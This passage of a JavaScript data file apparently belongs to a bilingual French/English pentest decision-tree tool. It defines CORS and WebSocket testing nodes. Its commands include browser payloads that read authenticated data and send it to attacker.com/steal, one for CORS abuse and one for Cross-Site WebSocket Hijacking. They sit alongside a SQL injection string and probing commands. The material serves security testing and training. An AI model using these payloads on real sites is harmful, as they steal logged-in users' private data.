      { label: "Payload exploitant le CORS (page HTML de l'attaquant)", label_en: "CORS exploit payload (attacker's HTML page)", cmd: '<script>\nfetch("https://TARGET_IP/api/profile", {credentials: "include"})\n  .then(r => r.text())\n  .then(d => fetch("https://attacker.com/steal?data=" + btoa(d)));\n</script>' },
      { label: "Test avec sous-domaine arbitraire", label_en: "Test with arbitrary subdomain", cmd: "curl -s -H 'Origin: https://evil.TARGET_IP' -I http://TARGET_IP/api/\n# Si Accept-Origin: evil.TARGET_IP → vulnérable via XSS sous-domaine" }
    ],
    lookfor: [
      "Access-Control-Allow-Origin reflète l'origine envoyée",
      "Access-Control-Allow-Credentials: true combiné avec ACAO dynamique",
      "ACAO: null (exploitable via iframe sandboxée)",
      "Wildcard *.domain.com avec sous-domaine contrôlable"
    ],
    lookfor_en: [
      "Access-Control-Allow-Origin reflects the sent origin",
      "Access-Control-Allow-Credentials: true combined with dynamic ACAO",
      "ACAO: null (exploitable via sandboxed iframe)",
      "Wildcard *.domain.com with controllable subdomain"
    ],
    tips: [
      "CORS n'est exploitable que si l'utilisateur est authentifié (session cookie)",
      "Seul dangereux si ACAO est dynamique ET Allow-Credentials: true",
      "Wildcard * seul n'est pas exploitable avec credentials",
      "Chercher dans Burp les réponses avec Access-Control-Allow-Origin"
    ],
    tips_en: [
      "CORS is only exploitable if the user is authenticated (session cookie)",
      "Only dangerous if ACAO is dynamic AND Allow-Credentials: true",
      "Wildcard * alone is not exploitable with credentials",
      "Search in Burp for responses with Access-Control-Allow-Origin"
    ],
    choices: [
      { label: "CORS exploitable → vol de données authentifiées", label_en: "Exploitable CORS → authenticated data theft", next: "web_authenticated", icon: "🔑" }
    ]
  },

  "web_websocket": {
    id: "web_websocket", title: "WebSocket Security Testing", title_en: "WebSocket Security Testing", category: "web", icon: "🔌",
    description: "Les WebSockets contournent souvent les protections CSRF et peuvent être vulnérables à des injections, CSWSH, ou des problèmes de contrôle d'accès.",
    description_en: "WebSockets often bypass CSRF protections and can be vulnerable to injections, CSWSH, or access control issues.",
    commands: [
      { label: "Identifier les WebSockets avec Burp", label_en: "Identify WebSockets with Burp", cmd: "# Dans Burp → onglet WebSockets History\n# Chercher les messages WS dans la tab Proxy" },
      { label: "Test injection via messages WS", label_en: "Test injection via WS messages", cmd: "# Intercepter un message WebSocket dans Burp\n# Modifier le contenu : tester SQLi, XSS, SSTI\n# Exemple payload : {\"user\": \"admin' OR 1=1--\"}" },
      { label: "CSWSH — Cross-Site WebSocket Hijacking", label_en: "CSWSH — Cross-Site WebSocket Hijacking", cmd: '<script>\nvar ws = new WebSocket("wss://TARGET_IP/chat");\nws.onmessage = function(e) {\n  fetch("https://attacker.com/steal?d=" + btoa(e.data));\n};\nws.onopen = function() { ws.send(\'{"action":"get_profile"}\'); };\n</script>' },
      { label: "wscat — client WebSocket CLI", label_en: "wscat — WebSocket CLI client", cmd: "wscat -c ws://TARGET_IP/ws\nwscat -c wss://TARGET_IP/ws --no-check\n# Interagir avec le serveur WS depuis le terminal" }
    ],
    lookfor: [
      "Upgrade: websocket dans les headers HTTP",
      "Messages WS sans token CSRF ou vérification d'origine",
      "Données sensibles transmises via WS sans authentification",
      "Contrôle d'accès horizontal : accéder aux données d'un autre user"
    ],
    lookfor_en: [
      "Upgrade: websocket in HTTP headers",
      "WS messages without CSRF token or origin check",
      "Sensitive data transmitted via WS without authentication",
      "Horizontal access control: access another user's data"
    ],
    tips: [
      "Burp Pro supporte l'interception et modification des messages WebSocket",
      "CSWSH nécessite que le serveur ne vérifie pas l'origine",
      "Tester si le handshake WebSocket utilise des cookies → CSWSH possible",
      "Portswigger WebSocket labs : excellent pour s'entraîner"
    ],
    tips_en: [
      "Burp Pro supports interception and modification of WebSocket messages",
      "CSWSH requires the server not to check the origin",
      "Test if the WebSocket handshake uses cookies → CSWSH possible",
      "Portswigger WebSocket labs: excellent for practice"
    ],
    choices: [
      { label: "Injection confirmée (SQLi/XSS/SSTI via WS)", label_en: "Injection confirmed (SQLi/XSS/SSTI via WS)", next: "web_param_vuln", icon: "💉" },
      { label: "CSWSH exploitable → vol de données", label_en: "CSWSH exploitable → data theft", next: "web_authenticated", icon: "🔑" }
    ]
  }

});

// Patch web_param_vuln to add XXE, CORS, WebSocket choices
if (NODES["web_param_vuln"]) {
  NODES["web_param_vuln"].choices.push(
    { label: "XXE confirmé — entités XML externes", label_en: "XXE confirmed — external XML entities", next: "web_xxe", icon: "📄" },
    { label: "CORS mal configuré (origine reflétée)", label_en: "CORS misconfigured (origin reflected)", next: "web_cors", icon: "🌐" },
    { label: "WebSocket détecté", label_en: "WebSocket detected", next: "web_websocket", icon: "🔌" }
  );
}

// Patch web_api to add WebSocket and CORS choices
if (NODES["web_api"]) {
  NODES["web_api"].choices.push(
    { label: "WebSocket dans l'application", label_en: "WebSocket in the application", next: "web_websocket", icon: "🔌" },
    { label: "CORS mal configuré sur l'API", label_en: "CORS misconfigured on the API", next: "web_cors", icon: "🌐" }
  );
}

console.log("[NullRoute] Extension chargée :", Object.keys(NODES).length, "nœuds au total");
